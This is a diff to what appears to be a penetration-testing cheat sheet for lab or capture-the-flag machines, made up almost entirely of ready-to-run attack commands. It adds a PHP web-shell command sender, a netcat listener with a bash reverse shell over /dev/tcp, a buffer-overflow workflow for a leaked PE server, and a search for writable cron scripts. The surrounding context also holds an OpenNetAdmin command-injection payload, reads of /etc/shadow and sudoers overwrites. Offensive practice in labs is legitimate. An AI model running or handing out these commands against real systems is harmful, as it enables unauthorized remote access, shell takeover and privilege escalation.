@@ -197,6 +197,12 @@ unzip -l $BoxDir/$Archive
 ```bash
 curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=id"
 curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=$Command"
+# PHP web-shell command parameter, preserving shell metacharacters in the form body
+curl -sS -X POST --data-urlencode 'cmd=id' "http://$BoxIP/$Path"
+curl -sS -X POST --data-urlencode "cmd=$Command" "http://$BoxIP/$Path"
+# Bash callback through a PHP web shell; start the listener first
+nc -lvnp $Lport
+curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'" "http://$BoxIP/$Path" >/dev/null
 # OpenNetAdmin 18.1.1 xajax command injection, with markers for XML output parsing
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" "http://$BoxIP/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
 # Confirm blind execution by watching for a callback ping
@@ -256,6 +262,23 @@ sed -n '1,220p' $BoxDir/exploit.py
 python2 $BoxDir/exploit.py $BoxIP $Port
 ```
 <!-- TODO --> <!-- Add service-specific Perl, Python, PHP, and compiled exploit launch commands. -->
+
+### Custom PE stack overflow
+
+```bash
+# Run a leaked 32-bit PE server locally under Wine for crash analysis
+wine $BoxDir/loot/$File
+# Generate a cyclic pattern and calculate the exact EIP overwrite offset
+msf-pattern_create -l $PatternLength
+msf-pattern_offset -l $PatternLength -q $EipValue
+# Confirm the PE image base and search the target binary for stack redirection gadgets
+objdump -p $BoxDir/loot/$File | grep ImageBase
+ROPgadget --binary $BoxDir/loot/$File | grep -E 'push esp ; ret$|call esp ; ret$|jmp esp$'
+# Send a reviewed binary exploit to a one-shot service; terminate its message as required
+python3 $BoxDir/loot/$Exploit.py $BoxIP $Port
+```
+
+> Use a null-free Linux x86 payload when a PE server runs under Wine on a Linux target. Keep the service socket open during shell startup when the payload depends on the triggering connection.
 
 ## 6. FOOTHOLD: SHELLS & PAYLOADS
 
@@ -401,6 +424,11 @@ cat /etc/passwd
 cat /etc/shadow 2>/dev/null
 uname -a
 searchsploit linux kernel $Version
+# Writable scheduled script: preserve the body, prove ownership and observe output timing
+find / -type f -writable 2>/dev/null | grep -E '^/(scripts|opt|etc/cron|var/www)'
+cat $ScriptPath | tee "$BoxDir/loot/$ScriptName.original"
+stat $ScriptPath $OutputPath
+# Restore the saved script and remove any target-side test helper after verification
 openssl passwd -1 -salt $Salt $Password
 dosbox -c 'mount c /etc' -c 'echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'
 bsdtar -xOf /var/cache/pacman/pkg/sudo-$Version-x86_64.pkg.tar.zst etc/sudoers > /etc/sudoers
